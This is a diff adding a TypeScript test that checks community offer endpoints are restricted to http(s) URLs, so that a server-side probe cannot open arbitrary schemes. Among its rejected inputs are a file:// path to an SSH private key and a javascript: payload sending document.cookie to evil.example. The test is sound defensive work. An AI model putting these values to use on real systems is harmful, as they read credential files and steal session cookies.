@@ -331,4 +331,51 @@ describe("CommunityOffer", () => {
     }).pipe(Effect.provide(CredentialCipher.defaultLayer)),
   )
 
+
+  it.effect("🔴 an endpoint must be an http(s) URL — it decides what our own SERVER opens", () =>
+    Effect.gen(function* () {
+      /**
+       * The endpoint was any string up to 512 bytes. It does not merely sit on screen: "Use this"
+       * prefills the add-model dialog, and that dialog probes through `POST /provider/:id/probe`,
+       * which runs SERVER-SIDE. So the scheme a stranger chose decided what the user's own server
+       * would open — `file://` reads the disk it runs on.
+       */
+      const offers = yield* CommunityOffer.Service
+      for (const endpoint of [
+        "file:///C:/Users/someone/.ssh/id_ed25519",
+        "javascript:fetch('http://evil.example?c='+document.cookie)",
+        "ftp://files.example/x",
+        "not a url at all",
+        "",
+        // ⚠️ Reads as http and is NOT: `httpx:` passes any `startsWith("http")` test, which is the
+        // hand-rolled check this one deliberately is not.
+        "httpx://a.example/v1",
+      ]) {
+        const published = yield* offers.publish({ ...terms, endpoint })
+        expect(CommunityOffer.verify(published)).toBe(false)
+        // Signed by US and still refused — the bound binds on the way OUT, so an offer stored by an
+        // older build stops being served rather than being trusted for sitting on disk.
+        expect(yield* offers.mine()).toBeUndefined()
+      }
+
+      // 🔴 THE CONTROL: the endpoints this feature exists to carry still pass — including a LAN
+      // address, which is a first-class use here and must NOT be filtered.
+      for (const endpoint of [
+        "https://spark.example:8010/v1",
+        "http://192.168.178.40:8000/v1",
+        "http://127.0.0.1:11434/v1",
+        /**
+         * ⚠️ Accepted, and I had this wrong first time: `new URL` NORMALISES this to
+         * `http://evil/`, so it is an ordinary http URL written oddly rather than a smuggled
+         * scheme. Refusing it would have been the test dictating to the runtime. Kept as a case
+         * because parsing is what makes the answer right in both directions.
+         */
+        "http:evil",
+      ]) {
+        const published = yield* offers.publish({ ...terms, endpoint })
+        expect(CommunityOffer.verify(published)).toBe(true)
+      }
+    }).pipe(Effect.provide(CredentialCipher.defaultLayer)),
+  )
+
 })
